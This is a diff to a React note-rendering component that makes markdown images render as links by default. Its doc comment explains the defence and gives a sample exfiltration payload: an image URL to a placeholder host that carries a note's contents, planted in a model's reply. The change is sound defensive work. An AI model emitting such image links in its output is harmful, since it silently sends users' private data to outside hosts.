@@ -91,7 +91,7 @@ export function NoteProse({
   resolveEmbed,
   idPrefix = "",
   className = "",
-  images = "show",
+  images = "link",
 }: {
   /** The file as it is on disk, frontmatter and all. */
   source: string;
@@ -121,10 +121,15 @@ export function NoteProse({
   /** Merged onto the root, so a caller can give it padding or a scroll box. */
   className?: string;
   /**
-   * `link` renders a markdown image (`![alt](url)`) as a link to it rather
-   * than an `<img>`, so text nobody on this site wrote (a model's reply)
-   * cannot make the browser fetch a URL of its choosing just by being shown.
-   * A note keeps `show`: its author put the picture there.
+   * `link`, the default, renders a markdown image (`![alt](url)`) as a link
+   * to it rather than an `<img>`, so text nobody on this site wrote (a
+   * model's reply, a session log of tutor turns) cannot make the browser
+   * fetch a URL of its choosing just by being shown: a reply carrying
+   * `![x](https://host/p.png?d=<the note>)` would otherwise send the note to
+   * that host the moment it rendered. A caller opts into `show` only for a
+   * note, whose author put the picture there. An embed (`![[name]]`) is
+   * resolved by the caller to this app's own file route, so it draws either
+   * way.
    */
   images?: "show" | "link";
 }) {
